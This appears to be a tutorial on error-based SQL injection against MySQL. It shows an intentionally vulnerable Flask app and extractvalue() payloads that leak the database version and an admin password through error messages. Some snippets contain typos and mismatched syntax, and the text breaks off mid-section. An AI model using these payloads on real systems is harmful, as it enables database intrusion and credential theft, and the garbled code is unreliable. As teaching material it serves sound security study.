## Intro
Attacking method of the sql injection differs by how application works. Error based and Time based SQL Injection emerged to attack the application that hides the result of the query. Both attacking method have the same vulnerability method, but distinguished by how to judge the success of the attack. 

## Error Based SQL Injection
```python title:SQL_Injection
from flask import Flask, request
import pymysql

app = Flask(__name__)

def getConnection():
	return pymysql.connect(host='localhost', user='dream`, password='hack', db='dreamhack', charset='utf-8')

@app.route('/', methods=['GET'])
def index():
	username = request.args.get('username')
	sql = "Select username from users where usernane='%s'" %username

	conn = getConnection();
	curs = conn.cursor(pymysql.cursors.DictCursor)
	curs.execute(sql)
	rows = curs.fetchall()
	conn.close()
	
	if(rows):
		return "True"
	else:
		return "False"

app.run(host='0.0.0.0', port=8000, debug=True)
```
Looking at the code, the debug is on, the entry the user entered can be included in SQL query without further investigation, leading SQL Injection vulnerability. However, there is no code to print the SQL query result, just returning the result of the query execution, 

Application based on the Flask framework prints the reason of the error of the code with the debug mode activated. The attacker can collect various informations and data through the error messages. 

## Writing Attacking Code
In order to use the error in the application to attack, we need to make the error occur not before the queries run, but during the Runtime. 

Following is the most commonly used during the error based sql attack.
```SQL
SELECT extractvalue(1, concat(0x3a, version()))
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/
```
The information of the operating system is included in the error message. 

extractvalue() function extracts the data from the XML data passed as the first argument and using the XPATH passed as the second argument. 
If the second argument is not the correct XPATH, it prints out the error message indicating that the XPATH syntax error. 

Example
```
SELECT extractvalue('<a>test</a> <b>abcd</b>, '/a');

test
1 row in set
```
```
Select extractvalue(1, ':abcd');

ERROR 1105(HY000): XPATH syntax error: ':abcd'
# ":" XPATH should not start with :
```

## Application of the extractvalue
Using this function, it is possible to extract the information of the database. Following subquery allows us to retrieve the data of the database. (0x3a is :)

```
SELECT extravalue(1, concat(0x3a), SELECT password FROM users WHERE username='admin')));

ERROR 1105 (HY000): XPATH syntax error: ':Th1sispassword'
```

## Application of Error based SQL Injection
### MySQL
```
SELECT 
```